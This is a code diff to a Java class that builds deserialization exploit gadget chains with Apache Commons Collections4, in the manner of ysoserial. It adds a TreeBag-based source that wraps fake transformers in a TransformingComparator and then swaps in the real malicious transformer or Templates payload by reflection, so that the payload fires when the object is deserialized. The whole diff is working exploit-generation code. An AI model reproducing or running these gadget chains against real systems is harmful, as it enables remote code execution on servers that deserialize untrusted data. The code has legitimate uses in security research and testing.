@@ -1,4 +1,5 @@
 import org.apache.commons.collections4.Transformer;
+import org.apache.commons.collections4.bag.TreeBag;
 import org.apache.commons.collections4.comparators.TransformingComparator;
 import org.apache.commons.collections4.functors.ChainedTransformer;
 import org.apache.commons.collections4.functors.ConstantTransformer;
@@ -49,7 +50,7 @@ public class Source4 {
 
         return obj;
     }
-    
+
     public static HashMap HashMapSource(SinkResult result) throws Exception {
         Transformer fakeTransformers = generateFakeTransformers();
 
@@ -93,7 +94,7 @@ public class Source4 {
         return obj;
     }
 
-    public static Hashtable HashtableSource(SinkResult result) throws Exception{
+    public static Hashtable HashtableSource(SinkResult result) throws Exception {
         Transformer fakeTransformers = generateFakeTransformers();
 
         Map innerMap1 = new HashMap();
@@ -121,6 +122,22 @@ public class Source4 {
             Reflections.setFieldValue(lazyMap1, "factory", result.transformer4);
             Reflections.setFieldValue(lazyMap2, "factory", result.transformer4);
         }
+
+        return obj;
+    }
+
+    public static TreeBag TreeBagSource(SinkResult result) throws Exception {
+        Transformer fakeTransformers = generateFakeTransformers();
+
+        TransformingComparator comp = new TransformingComparator(fakeTransformers);
+        TreeBag obj = new TreeBag(comp);
+        Object tpl = 1;
+        if (result.templates != null) {
+            tpl = result.templates;
+        }
+        obj.add(tpl);
+
+        Reflections.setFieldValue(comp, "transformer", result.transformer4);
 
         return obj;
     }
